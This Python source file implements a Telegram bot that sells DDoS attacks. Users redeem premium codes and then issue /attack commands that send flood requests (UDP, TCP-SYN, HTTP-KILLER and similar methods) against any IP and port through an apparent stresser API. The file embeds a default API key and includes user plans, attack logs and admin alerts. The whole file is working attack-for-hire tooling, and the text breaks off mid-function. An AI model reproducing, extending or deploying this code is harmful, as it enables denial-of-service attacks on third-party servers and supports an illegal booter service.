import os
import logging
import asyncio
import aiohttp
import time
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))

# CONCURRENT SETTINGS - Default 2 for multiple simultaneous attacks
CONFIG = {
    "DEFAULT_CONCURRENT": int(os.getenv("DEFAULT_CONCURRENT", "2"))
}
MIN_CONCURRENT = 1
MAX_CONCURRENT = 8
MIN_DURATION = 30
MAX_DURATION = 300

# ATTACK METHODS - UDP-FLOOD as default (maps to udp-free in API)
ATTACK_METHODS = [
    "UDP-FLOOD",  # DEFAULT - maps to udp-free
    "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

# CRITICAL: Method mapping - UDP-FLOOD must map to udp-free (lowercase)
METHOD_MAP = {
    "UDP-FLOOD": "udp-free",      # This is what the API expects
    "UDP-VSE": "udp-vse", 
    "UDP-DNS": "udp-dns",
    "TCP-SYN": "tcp-syn",
    "TCP-ACK": "tcp-ack",
    "TCP-STOMP": "tcp-stomp",
    "TCP-HANDSHAKE": "tcp-handshake",
    "ICMP-FLOOD": "icmp-flood",
    "GRE-FLOOD": "gre-flood",
    "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX",
    "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER",
    "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_concurrent():
    """Get current concurrent value"""
    return CONFIG["DEFAULT_CONCURRENT"]

def set_concurrent(value):
    """Set concurrent value"""
    CONFIG["DEFAULT_CONCURRENT"] = value

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = True
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000
                )
                self.client.admin.command('ping')
                
                self.db = self.client["guru_bot"]
                self.users_col = self.db.users
                self.codes_col = self.db.redeem_codes
                self.logs_col = self.db.attack_logs
                self.admins_col = self.db.admins
                self.settings_col = self.db.settings
                
                self.users_col.create_index("user_id", unique=True)
                self.codes_col.create_index("code", unique=True)
                self.admins_col.create_index("user_id", unique=True)
                
                if not self.settings_col.find_one({"_id": "bot_settings"}):
                    self.settings_col.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                self.memory_mode = False
                logger.info("✅ MongoDB connected successfully!")
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if self.memory_mode:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id,
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }
                    return True
                return False
            else:
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username,
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False
    
    def get_user(self, user_id):
        try:
            if self.memory_mode:
                return self.users.get(user_id)
            else:
                return self.users_col.find_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            
            if plan == "free":
                return "free", None
            
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        return "premium", None
                
                if expiry and isinstance(expiry, datetime):
                    if expiry < datetime.now():
                        return "premium", expiry
                    else:
                        return "premium", expiry
                else:
                    return "premium", None
            
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
                    return True
                return False
            else:
                expiry_str = expiry.isoformat() if expiry else None
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": plan,
                        "plan_expiry": expiry_str,
                        "has_used_code": True if plan == "premium" else False
                    }}
                )
                return result.modified_count > 0 or result.matched_count > 0
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False
    
    def is_admin(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins
            else:
                return self.admins_col.find_one({"user_id": user_id}) is not None
        except:
            return False
    
    def get_admin_level(self, user_id):
        try:
            if self.memory_mode:
                return self.admins.get(user_id, {}).get("level")
            else:
                admin = self.admins_col.find_one({"user_id": user_id})
                return admin.get("level") if admin else None
        except:
            return None
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if self.is_admin(user_id):
                return False
            
            if self.memory_mode:
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                return True
            else:
                self.admins_col.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
            else:
                result = self.admins_col.delete_one({"user_id": user_id})
                return result.deleted_count > 0
        except:
            return False
    
    def get_admins(self):
        try:
            if self.memory_mode:
                return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
            else:
                return list(self.admins_col.find({}))
        except:
            return []
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = True
                    self.users[user_id]["ban_reason"] = reason
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
                )
                return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = False
                    self.users[user_id]["ban_reason"] = None
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
                )
                return True
        except:
            return False
    
    def create_code(self, code, days, created_by):
        try:
            if self.memory_mode:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
            else:
                if self.codes_col.find_one({"code": code}):
                    return False
                self.codes_col.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "used_by": None,
                    "used_at": None,
                    "is_used": False
                })
                return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False
    
    def use_code(self, code, user_id):
        try:
            if self.memory_mode:
                if code not in self.codes or self.codes[code].get("is_used"):
                    return None
                
                code_data = self.codes[code]
                code_data["is_used"] = True
                code_data["used_by"] = user_id
                code_data["used_at"] = datetime.now()
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if user_id not in self.users:
                    self.add_user(user_id)
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = expiry
                self.users[user_id]["has_used_code"] = True
                return code_data
            else:
                code_data = self.codes_col.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes_col.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if not self.get_user(user_id):
                    self.add_user(user_id)
                
                expiry_str = expiry.isoformat() if expiry else None
                
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": "premium",
                        "plan_expiry": expiry_str,
                        "has_used_code": True,
                        "code_used": code,
                        "redeem_date": datetime.now().isoformat()
                    }}
                )
                
                return code_data
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None
    
    def get_codes(self, only_unused=False):
        try:
            if self.memory_mode:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c.get("is_used")]
                return codes
            else:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes_col.find(query).sort("created_at", -1))
        except:
            return []
    
    def delete_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            else:
                result = self.codes_col.delete_one({"code": code})
                return result.deleted_count > 0
        except:
            return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            
            if self.memory_mode:
                self.logs.append(log)
            else:
                self.logs_col.insert_one(log)
            
            # Update user attack count
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$inc": {"attack_count": 1},
                     "$set": {"last_attack_time": datetime.now().isoformat(),
                              "last_attack_duration": duration}}
                )
            return True
        except:
            return False
    
    def get_total_attacks(self):
        try:
            if self.memory_mode:
                return len(self.logs)
            else:
                return self.logs_col.count_documents({})
        except:
            return 0
    
    def get_user_stats(self, user_id):
        try:
            if self.memory_mode:
                return len([l for l in self.logs if l.get("user_id") == user_id])
            else:
                return self.logs_col.count_documents({"user_id": user_id})
        except:
            return 0
    
    def get_all_users(self):
        try:
            if self.memory_mode:
                return list(self.users.values())
            else:
                return list(self.users_col.find({}))
        except:
            return []
    
    def get_pause_info(self):
        try:
            if self.memory_mode:
                return {"paused": self.settings.get("pause_all", False)}
            else:
                settings = self.settings_col.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at"),
                        "pause_reason": settings.get("pause_reason")
                    }
                return {"paused": False}
        except:
            return {"paused": False}
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if self.memory_mode:
                self.settings["pause_all"] = paused
            else:
                self.settings_col.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            return True
        except:
            return False

db = Database(MONGO_URI)

# ===== INITIALIZE OWNERS =====
def init_owners():
    try:
        owner = db.get_user(OWNER_ID)
        if not owner:
            db.add_user(OWNER_ID, "owner", "Owner")
        
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        
        plan, expiry = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")

def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
            if not pseudo_owner:
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            
            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")

init_owners()
init_pseudo_owner()

# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method, concurrent):
    """Send attack to API with proper concurrent parameter"""
    api_key = API_KEY
    api_url = API_URL
    
    if not api_key:
        return {"success": False, "error": "API Key missing"}
    
    # CRITICAL: Get the correct API method name (lowercase)
    api_method = METHOD_MAP.get(method.upper(), "udp-free")
    
    # Build parameters exactly as the working URL shows
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method,  # This MUST be lowercase (udp-free, tcp-syn, etc.)
        "concs": str(concurrent)
    }
    
    # Advanced options for L7 methods
    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
        params["req_method"] = "GET"
        params["geoloc"] = "MIX"
        params["version"] = "1"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    
    # Log the exact URL being sent (for debugging)
    full_url = f"{api_url}?{'&'.join([f'{k}={v}' for k, v in params.items()])}"
    logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
    logger.info(f"📡 Full URL: {full_url}")
    logger.info(f"📡 Method: {api_method}")
    
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:200]}
                
                logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                logger.info(f"📊 Response: {response_text[:200]}")
                
                # Check if attack was successful
                if response.status == 200 and response_data.get('status') == 'success':
                    return {
                        "success": True,
                        "elapsed": elapsed,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data,
                        "attack_id": response_data.get('attack_id', 'N/A')
                    }
                else:
                    # Check for specific error messages
                    error_msg = response_data.get('message', f'HTTP {response.status}')
                    return {
                        "success": False,
                        "error": error_msg,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": concurrent}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:50], "concurrent": concurrent}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.is_running = False
        self.current_target = None
        self.current_user = None
        self.attack_start_time = None
        self.attack_duration = 0
        self.current_concurrent = get_concurrent()
        self.total_attacks = 0
        self.lock = asyncio.Lock()
        self.attack_task = None
        logger.info(f"🔥 Attack Manager initialized with concurrent: {get_concurrent()}")
    
    async def can_start_attack(self, user_id):
        if self.is_running:
            if self.attack_start_time:
                elapsed = (datetime.now() - self.attack_start_time).total_seconds()
                remaining = max(0, self.attack_duration - elapsed)
                return False, f"❌ ATTACK IN PROGRESS!\n\n🎯 Target: {self.current_target}\n⏱️ Remaining: {int(remaining)}s\n🔄 Concurrent: **{self.current_concurrent}**"
        
        if db.is_banned(user_id):
            return False, "❌ You are banned!"
        
        plan, expiry = db.get_user_plan(user_id)
        is_owner = db.is_owner_or_pseudo(user_id)
        is_admin = db.is_admin(user_id)
        
        if not is_owner and not is_admin and plan != "premium":
            return False, "❌ PREMIUM REQUIRED\n\nUse `/redeem CODE` to activate."
        
        if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
            return False, "❌ PLAN EXPIRED"
        
        return True, "OK"
    
    async def start_attack(self, user_id, target, port, duration, method, context, concurrent):
        async with self.lock:
            if self.is_running:
                return None, "Attack already in progress!"
            
            self.is_running = True
            self.current_target = f"{target}:{port}"
            self.current_user = user_id
            self.attack_start_time = datetime.now()
            self.attack_duration = duration
            self.current_concurrent = concurrent
            self.total_attacks += 1
            
            logger.info(f"🔥 Attack starting - User: {user_id} - Target: {target}:{port} - Concurrent: {concurrent}")
            
            self.attack_task = asyncio.create_task(
                self.execute_attack(target, port, duration, user_id, context, method, concurrent)
            )
            asyncio.create_task(self.cleanup_attack(duration))
            
            return True, f"Attack started with {concurrent} concurrent connections"
    
    async def execute_attack(self, target, port, duration, user_id, context, method, concurrent):
        try:
            result = await send_api_attack(target, port, duration, method, concurrent)
            
            db.log_attack(
                user_id, target, port, duration, method,
                "success" if result.get('success') else "failed",
                str(result.get('response', {}))[:200],
                concurrent
            )
            
            if result.get('success'):
                attack_id = result.get('attack_id', 'N/A')
                await context.bot.send_message(
                    user_id,
                    f"✅ *Attack Completed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏱️ Duration: `{duration}s`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"🆔 Attack ID: `{attack_id}`\n"
                    f"⚡ Status: SUCCESS",
                    parse_mode='Markdown'
                )
            else:
                error = result.get('error', 'Unknown error')
                await context.bot.send_message(
                    user_id,
                    f"❌ *Attack Failed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"❌ Error: `{error}`",
                    parse_mode='Markdown'
                )
                
            # Send alert to admins
            admins = db.get_admins()
            for admin in admins:
                try:
                    status_emoji = "✅" if result.get('success') else "❌"
                    await context.bot.send_message(
                        admin['user_id'],
                        f"⚡ *ATTACK ALERT*\n\n"
                        f"{status_emoji} Status: {'SUCCESS' if result.get('success') else 'FAILED'}\n"
                        f"👤 User: {user_id}\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: {duration}s\n"
                        f"📡 Method: {method}\n"
                        f"🔄 Concurrent: **{concurrent}**",
                        parse_mode='Markdown'
                    )
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"❌ Attack error: {e}")
    
    async def cleanup_attack(self, duration):
        await asyncio.sleep(duration + 2)
        async with self.lock:
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = get_concurrent()
            self.attack_task = None
            logger.info("✅ Attack cleaned up")
    
    async def stop_attack(self, user_id):
        async with self.lock:
            if not self.is_running:
                return False, "No attack is running"
            
            if self.attack_task and not self.attack_task.done():
                self.attack_task.cancel()
            
            target = self.current_target
            self.is_running = False
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = get_concurrent()
            self.attack_task = None
            
            return True, f"Attack on {target} stopped"
    
    def get_stats(self):
        remaining = 0
        if self.is_running and self.attack_start_time:
            elapsed = (datetime.now() - self.attack_start_time).total_seconds()
            remaining = max(0, self.attack_duration - elapsed)
        
        return {
            'is_running': self.is_running,
            'current_target': self.current_target,
            'current_user': self.current_user,
            'remaining_time': int(remaining),
            'total_attacks': self.total_attacks,
            'concurrent_value': self.current_concurrent if self.is_running else get_concurrent()
        }

attack_manager = AttackManager()

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    db.add_user(user_id, user.username, user.first_name)
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    stats = attack_manager.get_stats()
    total_attacks = db.get_user_stats(user_id)
    
    plan_display = "💎 PREMIUM" if plan == "premium" else "🆓 FREE"
    if plan == "premium" and expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display = f"💎 PREMIUM ({days_left}d left)"
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {user.first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"⏱️ Remaining: {stats['remaining_time']}s\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
        f"📡 Default method: UDP-FLOOD (udp-free)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
        f"⚡ *ATTACK FEATURES*\n"
        f"• {get_concurrent()}x concurrent connections\n"
        f"• Only 1 attack at a time\n"
        f"📡 *Methods:* " + ", ".join(ATTACK_METHODS[:5]) + f"... (+{len(ATTACK_METHODS)-5} more)"
    )
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME [METHOD] [CONCURRENT]`\n\n"
            f"Example: `/attack 8.8.8.8 43 30`\n"
            f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`\n"
            f"With concurrent: `/attack 8.8.8.8 43 30 UDP-FLOOD 4`\n\n"
            f"⚡ Current concurrent: **{get_concurrent()}**\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
            f"📡 Default Method: UDP-FLOOD (udp-free)\n"
            f"📡 Methods: {', '.join(ATTACK_METHODS[:5])}...",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = "UDP-FLOOD"
        concurrent = get_concurrent()
        
        if len(args) > 3:
            if args[3].upper() in ATTACK_METHODS:
                method = args[3].upper()
                if len(args) > 4:
                    concurrent = int(args[4])
            else:
                try:
                    concurrent = int(args[3])
                    if len(args) > 4:
                        method = args[4].upper()
                except:
                    method = args[3].upper()
        
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
            return
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        success, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context, concurrent
        )
        
        if not success:
            await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
            return
        
        await update.message.reply_text(
            f"✅ *ATTACK STARTED!*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"📡 Method: `{method}` (udp-free)\n"
            f"🔄 Concurrent: **{concurrent}**\n"
            f"⚡ Status: **RUNNING**\n\n"
            f"⚠️ Only 1 attack at a time!\n"
            f"⏳ Remaining: {duration}s",
            parse_mode='Markdown'
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time!\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can stop attacks!")
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    
    if success:
        await update.message.reply_text(
            f"🛑 *Attack Stopped!*\n\n{msg}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(f"❌ {msg}")

async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can change concurrent settings!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"⚡ *CONCURRENT SETTINGS*\n\n"
            f"Current: **{get_concurrent()}**\n"
            f"Min: {MIN_CONCURRENT}\n"
            f"Max: {MAX_CONCURRENT}\n\n"
            f"Usage: `/setconcurrent 2`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_concurrent = int(args[0])
        if new_concurrent < MIN_CONCURRENT or new_concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
            return
        
        set_concurrent(new_concurrent)
        
        await update.message.reply_text(
            f"✅ *Concurrent updated!*\n\n"
            f"New concurrent: **{get_concurrent()}**\n"
            f"All future attacks will use {get_concurrent()} concurrent connections.",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test API parameters!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"🔬 *API TEST COMMAND*\n\n"
            f"Usage: `/testapi HOST PORT TIME [CONCURRENT] [METHOD]`\n\n"
            f"Examples:\n"
            f"`/testapi 8.8.8.8 43 30` (Uses UDP-FLOOD default)\n"
            f"`/testapi 8.8.8.8 43 30 2` (UDP-FLOOD with 2 concurrent)\n"
            f"`/testapi 8.8.8.8 43 30 2 TCP-SYN`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        concurrent = get_concurrent()
        method = "UDP-FLOOD"
        
        if len(args) > 3:
            try:
                concurrent = int(args[3])
                if len(args) > 4:
                    method = args[4].upper()
            except ValueError:
                method = args[3].upper()
                if len(args) > 4:
                    concurrent = int(args[4])
        
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        status_msg = await update.message.reply_text(
            f"🔬 *Testing API...*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Concurrent: `{concurrent}`\n"
            f"Method: `{method}`",
            parse_mode='Markdown'
        )
        
        result = await send_api_attack(target, port, duration, method, concurrent)
        
        if result.get('success'):
            await status_msg.edit_text(
                f"✅ *API TEST SUCCESSFUL*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"🔄 Concurrent: `{concurrent}`\n"
                f"📡 Method: `{method}`\n"
                f"⚡ Status: `{result.get('status')}`\n"
                f"🆔 Attack ID: `{result.get('attack_id', 'N/A')}`\n"
                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
                f"📋 Response: `{str(result.get('response', {}))[:200]}`",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *API TEST FAILED*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"🔄 Concurrent: `{concurrent}`\n"
                f"📡 Method: `{method}`\n"
                f"❌ Error: `{result.get('error', 'Unknown error')}`",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
